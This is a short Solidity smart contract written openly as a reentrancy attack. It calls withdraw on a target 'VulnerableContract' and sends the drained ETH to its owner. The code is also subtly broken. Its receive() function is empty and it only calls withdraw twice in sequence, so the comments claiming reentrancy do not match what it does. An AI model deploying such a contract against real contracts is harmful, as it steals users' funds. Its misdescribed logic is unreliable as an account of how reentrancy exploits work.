// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface VulnerableContract {
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttack {
    VulnerableContract public vulnerableContract;
    address public owner;
    uint256 public attackAmount;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
        owner = msg.sender;
    }

    receive() external payable {}

    function setAttackAmount(uint256 amount) external {
        // Only the owner can set the attack amount
        require(msg.sender == owner, "Only the owner can set the attack amount");
        attackAmount = amount;
    }

    function reentrancyAttack() external {
        // Only the owner can trigger the reentrancy attack
        require(msg.sender == owner, "Only the owner can trigger the reentrancy attack");

        // Call the vulnerable contract's withdraw function with the specified attack amount
        vulnerableContract.withdraw(attackAmount);

        // Trigger the reentrancy attack
        _reentrancyAttack();
    }

    function _reentrancyAttack() private {
        // Reenter the vulnerable contract's withdraw function with the specified attack amount
        vulnerableContract.withdraw(attackAmount);
    }

    // Function to withdraw any ETH trapped in this contract
    function withdraw() external {
        require(msg.sender == owner, "Only the owner can withdraw");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
}